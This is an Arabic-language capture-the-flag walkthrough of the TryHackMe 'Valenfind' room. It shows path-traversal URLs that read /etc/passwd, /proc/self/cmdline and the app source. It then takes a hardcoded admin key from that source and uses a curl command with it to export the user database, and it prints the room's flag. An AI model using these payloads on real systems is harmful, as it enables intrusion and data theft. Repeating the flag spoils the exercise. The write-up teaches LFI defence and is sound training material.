# حل غرفة Valenfind

> **الحالة:** مكتملة رسمياً داخل TryHackMe؛ تم قبول العلم وظهرت صفحة **Great work 9gkc! Room completed!**.

## معلومات الغرفة

| البيان | القيمة |
|---|---|
| اسم الغرفة | Valenfind |
| الفعالية | Love at First Breach 2026 |
| الرابط الرسمي | [TryHackMe — Valenfind][1] |
| الصعوبة | Medium |
| عنوان الجهاز | `10.49.138.217` |
| التطبيق | `http://10.49.138.217:5000` |
| المهمة | Task 1 — What is the flag? |
| النتيجة | **Correct Answer** ثم **Room completed** |
| النقاط | 200 |

## الإجابة المؤكدة

| المهمة | السؤال | الإجابة | التحقق |
|---|---|---|---|
| Task 1 | What is the flag? | `THM{v1be_c0ding_1s_n0t_my_cup_of_t3a}` | **Correct Answer** داخل TryHackMe ثم صفحة الإكمال الرسمية |

تم الحفاظ على حالة الأحرف كما قبلتها المنصة: البادئة `THM` بأحرف كبيرة، وباقي العلم كما هو موضح في الجدول.

## ملخص السيناريو

تقدم الغرفة تطبيق مواعدة باسم Valenfind، وتطلب اكتشاف الثغرات الموجودة فيه. يقود استعراض الملفات الشخصية إلى حساب `cupid`، الذي يحتوي على تلميح يشير إلى حماية قاعدة البيانات. يكشف فحص مصدر الصفحة عن استدعاء يعتمد على قيمة `layout` من المستخدم، وهو مدخل إلى قراءة ملفات محلية.[1] [2]

## خطوات الاستغلال

### 1. اكتشاف نقطة Local File Inclusion

يستدعي التطبيق endpoint القالب التالي:

```text
GET /api/fetch_layout?layout=theme_classic.html
```

تُمرر قيمة `layout` إلى الخادم دون تقييد كافٍ. لذلك يمكن تجربة اجتياز المسارات بقراءة ملف النظام المعتاد `/etc/passwd`:

```text
http://10.49.138.217:5000/api/fetch_layout?layout=../../../../etc/passwd
```

إعادة محتوى `/etc/passwd` تؤكد وجود **Local File Inclusion (LFI)** أو Path Traversal، أي إمكانية قراءة ملفات محلية يختارها المستخدم.[2]

### 2. تحديد موقع التطبيق

يُستخدم نظام `/proc` لمعرفة الأمر الذي شغّل العملية الحالية. الطلب التالي يقرأ `/proc/self/cmdline`:

```text
http://10.49.138.217:5000/api/fetch_layout?layout=../../../../proc/self/cmdline
```

تكشف الاستجابة أن التطبيق يعمل من المسار:

```text
/opt/Valenfind/app.py
```

### 3. قراءة الشفرة المصدرية واستخراج المفتاح

تُقرأ الشفرة المصدرية عبر نقطة LFI نفسها:

```text
http://10.49.138.217:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py
```

تظهر في الشفرة قيمة سرية ثابتة:

```python
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
```

كما تكشف الشفرة endpoint إداري لتصدير قاعدة البيانات:

```text
/api/admin/export_db
```

وتتطلب نقطة التصدير ترويسة المصادقة التالية:

```text
X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO
```

إن وضع مفتاح إداري داخل الشفرة يجعل الحصول على المصدر كافياً لتجاوز الحماية، ولذلك كان كشف المصدر عبر LFI هو حلقة التصعيد الأساسية.[2] [3]

### 4. تصدير قاعدة البيانات

يُستخدم المفتاح المستخرج لطلب نسخة من قاعدة البيانات:

```bash
curl -H 'X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO' \
  http://10.49.138.217:5000/api/admin/export_db \
  -o valenfind_leak.db
```

بعد تنزيل الملف، تُفحص قاعدة SQLite:

```bash
sqlite3 valenfind_leak.db
```

ثم داخل موجه SQLite:

```sql
.tables
SELECT * FROM users;
```

تظهر في بيانات المستخدمين قيمة العلم النهائي.

## العلم النهائي

```text
THM{v1be_c0ding_1s_n0t_my_cup_of_t3a}
```

## التحقق داخل TryHackMe

تم إدخال العلم في حقل Task 1 داخل صفحة الغرفة ثم الضغط على **Check**. ظهرت عبارة **Correct Answer**. وبعد تحديث النتيجة انتقلت المنصة إلى صفحة التهنئة، حيث ظهرت الرسالة:

> **Great work 9gkc! Room completed!**

وأظهرت الصفحة إكمال مهمة واحدة والحصول على **200 نقطة**؛ لذلك تم التحقق من الإجابة رسمياً داخل TryHackMe.[1]

## سلسلة الهجوم

يمكن تلخيص السلسلة التقنية كما يلي:

```text
استعراض ملف cupid
        ↓
كشف /api/fetch_layout
        ↓
LFI عبر اجتياز المسارات
        ↓
قراءة /proc/self/cmdline
        ↓
العثور على /opt/Valenfind/app.py
        ↓
استخراج ADMIN_API_KEY
        ↓
استدعاء /api/admin/export_db
        ↓
فحص قاعدة SQLite
        ↓
استخراج العلم
```

## الدروس الأمنية

توضح الغرفة أن قراءة الملفات المحلية قد تتحول بسرعة إلى اختراق كامل للتطبيق إذا كانت الشفرة تحتوي على أسرار ثابتة أو نقاط إدارية محمية بترويسة يمكن إعادة استخدامها. يجب تقييد أسماء القوالب بقائمة سماح، ومنع أي مدخلات تسمح بالوصول إلى مسارات خارج مجلد القوالب، ونقل الأسرار إلى مدير أسرار أو متغيرات بيئة، إضافةً إلى فرض مصادقة قوية وتفويض فعلي على وظائف تصدير قواعد البيانات.

## المراجع

[1]: https://tryhackme.com/room/lafb2026e10 "TryHackMe — Valenfind"

[2]: https://infosecwriteups.com/tryhackme-free-ctf-walkthrough-love-at-first-breach-2026-valenfind-b5d3766b7dad "Hibullahi AbdulAzeez — TryHackMe CTF Walkthrough: Love at First Breach 2026: Valenfind"

[3]: https://medium.com/@cyber.crat0712/tryhackme-valenfind-writeup-hardcoded-keys-broken-hearts-f1cede83ab12 "Cyber.Crat — TryHackMe Valenfind Writeup: Hardcoded Keys & Broken Hearts"

---

إعداد: **Manus AI**

إطار الاستخدام: جميع الخطوات ضمن مختبر TryHackMe المصرح به ولأغراض تعليمية ودفاعية.

